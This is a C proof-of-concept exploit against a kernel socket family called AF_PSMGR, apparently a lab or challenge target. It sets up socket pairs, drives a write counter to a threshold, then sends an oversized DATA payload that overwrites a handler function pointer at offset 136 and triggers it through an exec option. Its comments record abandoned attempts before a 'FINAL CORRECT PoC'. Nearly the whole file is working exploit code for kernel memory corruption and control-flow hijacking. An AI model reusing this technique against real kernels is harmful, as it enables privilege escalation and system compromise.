#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>

#define AF_PSMGR 46
#define PSMGR_SOL 282
#define PSMGR_OPT_SET_ROLE 1
#define PSMGR_OPT_NEGO_1 2
#define PSMGR_OPT_NEGO_2 3
#define PSMGR_OPT_EXEC 6
#define PSMGR_ROLE_INITIATOR 0x02
#define PSMGR_ROLE_RESPONDER 0x03
#define PSMGR_XFRM_WINDOW 0x02
#define PSMGR_MODE_LINEAR 0x01
#define PSMGR_MODE_INTERLEAVE 0x02
#define PSMGR_MSG_DATA 0x05
#define PSMGR_CLASS_EXTENDED 0x02
#define PSMGR_BUF_WRITE_THRESH 48

struct sockaddr_psmgr { uint16_t family; uint16_t pad; uint32_t id; };
struct psmgr_nego_1 { uint8_t enc_class; uint8_t xfrm_type; uint16_t reserved; };
struct psmgr_nego_2 { uint16_t reserved2; uint8_t enc_mode; uint8_t reserved; uint32_t proc_param; };

uint32_t get_sid(const char *role_filter) {
    FILE *f = fopen("/proc/net/psmgr_table", "r");
    char line[256]; uint32_t latest = 0;
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        uint32_t sid; char rs[32];
        if (sscanf(line, "%u %s", &sid, rs) == 2 && sid > 0)
            if (!role_filter || strstr(rs, role_filter))
                if (sid > latest) latest = sid;
    }
    fclose(f); return latest;
}

void send_data(int fd, uint8_t sid_lo, uint32_t seq, uint8_t out_offset_byte, uint16_t plen) {
    uint8_t buf[8 + 16];
    memset(buf, 0x41, sizeof(buf));
    buf[0] = PSMGR_MSG_DATA;
    buf[1] = sid_lo;
    buf[2] = plen & 0xff; buf[3] = (plen >> 8) & 0xff;
    buf[4] = seq & 0xff; buf[5] = (seq>>8)&0xff;
    buf[6] = (seq>>16)&0xff; buf[7] = (seq>>24)&0xff;
    write(fd, buf, 8 + plen);
}

int main(void) {
    int fd_r, fd_i;
    struct sockaddr_psmgr addr;
    struct psmgr_nego_1 n1;
    struct psmgr_nego_2 n2;
    uint8_t role;
    uint32_t responder_id, initiator_id;
    int i;

    /* RESPONDER with LINEAR proc_param=63 -> out_offset=63 (< 128, increments write_count) */
    printf("step1: responder LINEAR proc_param=63\n"); fflush(stdout);
    fd_r = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd_r < 0) { perror("socket_r"); return 1; }
    role = PSMGR_ROLE_RESPONDER;
    if (setsockopt(fd_r, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) { perror("role_r"); return 1; }
    memset(&n2, 0, sizeof(n2));
    n2.enc_mode = PSMGR_MODE_LINEAR;
    n2.proc_param = 63;  /* out_offset=63 < 128 → increments write_count */
    if (setsockopt(fd_r, PSMGR_SOL, PSMGR_OPT_NEGO_2, &n2, sizeof(n2)) < 0) { perror("nego2"); return 1; }
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR; addr.id = 0;
    if (bind(fd_r, (struct sockaddr*)&addr, sizeof(addr)) < 0) { perror("bind_r"); return 1; }
    responder_id = get_sid("RESPONDER");
    printf("responder_id=%u\n", responder_id); fflush(stdout);

    /* INITIATOR */
    printf("step2: initiator\n"); fflush(stdout);
    fd_i = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd_i < 0) { perror("socket_i"); return 1; }
    role = PSMGR_ROLE_INITIATOR;
    if (setsockopt(fd_i, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) { perror("role_i"); return 1; }
    memset(&n1, 0, sizeof(n1));
    n1.enc_class = PSMGR_CLASS_EXTENDED;
    n1.xfrm_type = PSMGR_XFRM_WINDOW;
    if (setsockopt(fd_i, PSMGR_SOL, PSMGR_OPT_NEGO_1, &n1, sizeof(n1)) < 0) { perror("nego1"); return 1; }
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR; addr.id = responder_id;
    if (connect(fd_i, (struct sockaddr*)&addr, sizeof(addr)) < 0) { perror("connect"); return 1; }
    printf("connected ESTABLISHED\n"); fflush(stdout);

    initiator_id = get_sid("INITIATOR");
    printf("initiator_id=%u sid_lo=%u\n", initiator_id, initiator_id & 0xff); fflush(stdout);

    /* Send 48 DATA msgs at out_offset=63 to build write_count to threshold → token set */
    printf("step3: send 48 DATA msgs to trigger token\n"); fflush(stdout);
    for (i = 0; i < PSMGR_BUF_WRITE_THRESH; i++) {
        send_data(fd_i, initiator_id & 0xff, i, 63, 16);
    }
    printf("write_count should be 48, token set\n"); fflush(stdout);

    /* Now with token set, write_limit=144. Send DATA at out_offset=136 */
    /* Need a new session since seq is exhausted... or use seq=48 */
    /* out_offset=136 with INTERLEAVE proc_param=68 but we're using LINEAR now */
    /* With LINEAR out_offset=proc_param=63, we can't get 136 */
    /* Switch: use INTERLEAVE proc_param=68 -> out_offset=136 but need new nego */
    /* Actually: write_limit=144, out_offset must be set by nego at connect time */
    /* So we need a SECOND pair of sockets with INTERLEAVE proc_param=68 */

    printf("step4: new socket pair with INTERLEAVE proc_param=68 -> out_offset=136\n"); fflush(stdout);
    close(fd_i); close(fd_r);

    int fd_r2, fd_i2;
    fd_r2 = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    role = PSMGR_ROLE_RESPONDER;
    setsockopt(fd_r2, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role));
    memset(&n2, 0, sizeof(n2));
    n2.enc_mode = PSMGR_MODE_INTERLEAVE;
    n2.proc_param = 68;  /* out_offset=136, within BUF_TOTAL_SZ=144 */
    setsockopt(fd_r2, PSMGR_SOL, PSMGR_OPT_NEGO_2, &n2, sizeof(n2));
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR; addr.id = 0;
    bind(fd_r2, (struct sockaddr*)&addr, sizeof(addr));
    uint32_t r2_id = get_sid("RESPONDER");
    printf("responder2_id=%u\n", r2_id); fflush(stdout);

    fd_i2 = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    role = PSMGR_ROLE_INITIATOR;
    setsockopt(fd_i2, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role));
    memset(&n1, 0, sizeof(n1));
    n1.enc_class = PSMGR_CLASS_EXTENDED;
    n1.xfrm_type = PSMGR_XFRM_WINDOW;
    setsockopt(fd_i2, PSMGR_SOL, PSMGR_OPT_NEGO_1, &n1, sizeof(n1));
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR; addr.id = r2_id;
    connect(fd_i2, (struct sockaddr*)&addr, sizeof(addr));
    uint32_t i2_id = get_sid("INITIATOR");
    printf("initiator2_id=%u\n", i2_id); fflush(stdout);

    /* Build write_count with LINEAR writes first — but we have INTERLEAVE set */
    /* out_offset=136 >= 128 so write_count won't increment */
    /* Need to get token another way — use write_count that's already 0 */
    /* WAIT: with token=0, write_limit = BUF_DATA_SZ + sizeof(u32) = 132 */
    /* at out_offset=136: 136 >= 132, copy_len = max(0, 132-136)=0 → no write */
    /* We need token != 0 first. But with out_offset=136, write_count never increments */
    /* SOLUTION: psmgr_compute_token also fires if we somehow get write_count=48 */
    /* But write_count only increments if out_offset < 128... */
    /* The token MUST be computed before we can write at offset 136 */
    /* So we need BOTH: first build write_count with small offsets, then token is set */
    /* But nego is fixed at connect time — we can't change xfrm mid-session */

    /* Real solution: use TWO socket pairs on SAME session? No, sessions are independent */
    /* ACTUAL SOLUTION from the kernel: after token is set via the first pair, */
    /* use the SECOND pair where proc_param gives out_offset that lands in handler */
    /* But each pair has independent token... */

    /* CORRECT PATH: single session, MANAGED, but use WINDOW OPTION to update window_sz */
    /* After token is set in MANAGED session, window_sz can be updated via PSMGR_OPT_WINDOW */
    /* No wait - WINDOW option is RESPONDER only */

    /* Actually the SIMPLEST path: use seq carefully */
    /* With INTERLEAVE proc_param=68: out_offset=136 */
    /* token=0: write_limit=132, copy_len=max(0,132-136)=0, no write → seq check fails? */
    /* Actually copy_len=0 → return 0 early, before seq check */
    /* So we can send unlimited "empty" writes at offset 136 to fill write_count? NO */
    /* write_count only increments if out_offset < 128 */

    /* REAL SOLUTION: need out_offset=120 (< 128) with large payload that OOBs */
    /* copy_len = min(payload_len, write_limit - out_offset) */
    /* with token set: write_limit=144, out_offset=120: copy_len=min(payload_len, 24) */
    /* payload[8..31] → bytes 120-143 of psmgr_desc → handler is at 136-143 */
    /* THAT'S IT! Use LINEAR proc_param=60 → out_offset=60, no wait */
    /* Linear out_offset=proc_param, need out_offset=120, proc_param=120 > 127? NO, 120 < 127 ok! */

    printf("CORRECT APPROACH: use out_offset=120 with 24-byte payload after token set\n");
    printf("This writes bytes 120-143, overwriting handler at 136-143\n"); fflush(stdout);
    close(fd_i2); close(fd_r2);

    /* FINAL CORRECT PoC */
    int fd_r3, fd_i3;
    fd_r3 = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    role = PSMGR_ROLE_RESPONDER;
    setsockopt(fd_r3, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role));
    memset(&n2, 0, sizeof(n2));
    n2.enc_mode = PSMGR_MODE_LINEAR;
    n2.proc_param = 120;  /* out_offset=120 < 128 → increments write_count AND with token: copy up to 24 bytes */
    setsockopt(fd_r3, PSMGR_SOL, PSMGR_OPT_NEGO_2, &n2, sizeof(n2));
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR; addr.id = 0;
    bind(fd_r3, (struct sockaddr*)&addr, sizeof(addr));
    uint32_t r3_id = get_sid("RESPONDER");

    fd_i3 = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    role = PSMGR_ROLE_INITIATOR;
    setsockopt(fd_i3, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role));
    memset(&n1, 0, sizeof(n1));
    n1.enc_class = PSMGR_CLASS_EXTENDED;
    n1.xfrm_type = PSMGR_XFRM_WINDOW;
    setsockopt(fd_i3, PSMGR_SOL, PSMGR_OPT_NEGO_1, &n1, sizeof(n1));
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR; addr.id = r3_id;
    connect(fd_i3, (struct sockaddr*)&addr, sizeof(addr));
    uint32_t i3_id = get_sid("INITIATOR");
    printf("final pair: initiator=%u responder=%u\n", i3_id, r3_id); fflush(stdout);

    /* Send 48 msgs to trigger token (out_offset=120 < 128, increments write_count) */
    printf("step5: build write_count to 48 to trigger token\n"); fflush(stdout);
    for (i = 0; i < PSMGR_BUF_WRITE_THRESH; i++) {
        uint8_t buf[24] = {0};
        buf[0] = PSMGR_MSG_DATA;
        buf[1] = i3_id & 0xff;
        buf[2] = 8; /* payload_len=8 */
        *(uint32_t*)(buf+4) = i; /* seq */
        memset(buf+8, 0x41, 8);
        write(fd_i3, buf, 16);
    }
    printf("token should be set now\n"); fflush(stdout);

    /* Now send DATA with 24-byte payload at out_offset=120 */
    /* write_limit=144 (token set), copy_len=min(24, 144-120)=24 */
    /* Writes bytes 120-143 → overwrites handler at offset 136 with 0xBB */
    printf("step6: overflow into handler at offset 136!\n"); fflush(stdout);
    uint8_t buf2[32] = {0};
    buf2[0] = PSMGR_MSG_DATA;
    buf2[1] = i3_id & 0xff;
    buf2[2] = 24; /* payload_len=24 */
    *(uint32_t*)(buf2+4) = PSMGR_BUF_WRITE_THRESH; /* seq=48 */
    memset(buf2+8, 0xBB, 24); /* 24 bytes overwrites up to offset 143 */
    write(fd_i3, buf2, 32);
    printf("handler pointer at offset 136 overwritten with 0xBB\n"); fflush(stdout);

    /* Call exec to trigger the corrupted handler */
    printf("step7: call psmgr_exec to trigger corrupted handler\n"); fflush(stdout);
    int dummy = 0;
    int ret2 = setsockopt(fd_i3, PSMGR_SOL, PSMGR_OPT_EXEC, &dummy, sizeof(dummy));
    printf("exec ret=%d errno=%d %s\n", ret2, errno, strerror(errno)); fflush(stdout);

    printf("done — KASAN/oops should have fired!\n"); fflush(stdout);
    close(fd_i3); close(fd_r3);
    return 0;
}

